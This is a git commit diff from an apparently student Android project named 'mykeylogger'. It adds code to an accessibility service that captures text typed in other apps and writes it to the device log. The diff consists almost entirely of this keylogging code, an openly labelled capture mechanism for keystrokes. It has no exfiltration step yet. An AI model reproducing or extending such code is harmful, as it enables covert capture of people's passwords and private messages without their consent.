75c0a58d6115c51928998a211e0cc9a8abac6ab9
D <danelbo@post.bgu.ac.il>
2024-02-01 12:05:20 +0200

    MainActivity left

--- app/src/main/java/com/example/mykeylogger/MyServiceKL.java
+++ app/src/main/java/com/example/mykeylogger/MyServiceKL.java
@@ -4,6 +4,8 @@ import android.accessibilityservice.AccessibilityService;
 import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
+import android.text.TextUtils;
+import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
 public class MyServiceKL extends AccessibilityService {
@@ -12,12 +14,28 @@ public class MyServiceKL extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            String changedText = getEventText(event);
 
+            if (!TextUtils.isEmpty(changedText)) {
+                // Do something with the changed text
+                Log.i("TAG1", "Changed Text: " + changedText);
+            }
+        }
     }
 
     @Override
     public void onInterrupt() {
 
+    }
+
+    private String getEventText(AccessibilityEvent event) {
+        StringBuilder sb = new StringBuilder();
+        for (CharSequence s : event.getText()) {
+            sb.append(s);
+
+        }
+        return sb.toString();
     }
 
     /*@Override
